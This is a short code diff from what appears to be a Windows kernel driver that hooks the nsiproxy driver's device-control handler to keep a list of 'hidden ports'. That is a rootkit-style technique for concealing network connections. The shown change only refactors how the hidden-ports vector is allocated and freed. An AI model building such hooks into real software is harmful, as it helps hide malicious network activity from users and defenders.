@@ -154,8 +154,7 @@ NTSTATUS NetHook::initNsiHook() {
 	}
 
 	//initialize global ptr to hidden ports vector
-	hidden_ports = static_cast<vector<USHORT>*>(ExAllocatePool(PagedPool, sizeof(vector<USHORT>)));
-	*hidden_ports = vector<USHORT>();
+	hidden_ports = new vector<USHORT>;
 
 	//save the original device control function of the nsiproxy driver
 	original_nsi_device_io = pNsi_driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL];
@@ -182,7 +181,5 @@ void NetHook::unhookNsiProxy() {
 	KeDelayExecutionThread(KernelMode, 0, &wait_time);
 
 	//free the hidden ports vector
-	hidden_ports->free_mem();
-	ExFreePool(hidden_ports);
-	hidden_ports = nullptr;
+	delete hidden_ports;
 }
